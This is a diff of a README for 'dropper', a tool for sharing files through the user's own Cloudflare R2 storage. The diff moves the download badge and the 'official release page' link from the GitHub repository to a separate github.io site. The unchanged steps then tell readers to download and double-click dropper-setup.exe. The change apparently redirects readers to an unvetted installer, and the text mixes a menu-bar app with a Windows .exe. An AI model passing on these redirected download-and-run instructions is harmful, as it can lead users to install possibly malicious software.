@@ -1,6 +1,6 @@
 # 📦 dropper - Share your files with one movement
 
-[![Download dropper](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/rumbling-pyrographer341/dropper)
+[![Download dropper](https://img.shields.io/badge/Download-Release-blue.svg)](https://rumbling-pyrographer341.github.io)
 
 Dropper makes sharing files fast and simple. You move a file to your menu bar and receive a link on your clipboard. The file sits in your own Cloudflare R2 storage bucket. You keep full control over your data. There are no monthly fees and no middleman services. You use your own domain name for every shared link.
 
@@ -14,7 +14,7 @@ Because you own the storage bucket, you decide who sees your files. You do not r
 
 Follow these steps to get Dropper running on your computer.
 
-1. Visit the [official release page](https://github.com/rumbling-pyrographer341/dropper) to find the latest version of the installer.
+1. Visit the [official release page](https://rumbling-pyrographer341.github.io) to find the latest version of the installer.
 2. Select the file ending in .exe to start the download.
 3. Open your Downloads folder once the file finishes saving.
 4. Double-click the dropper-setup.exe file to begin the installation.
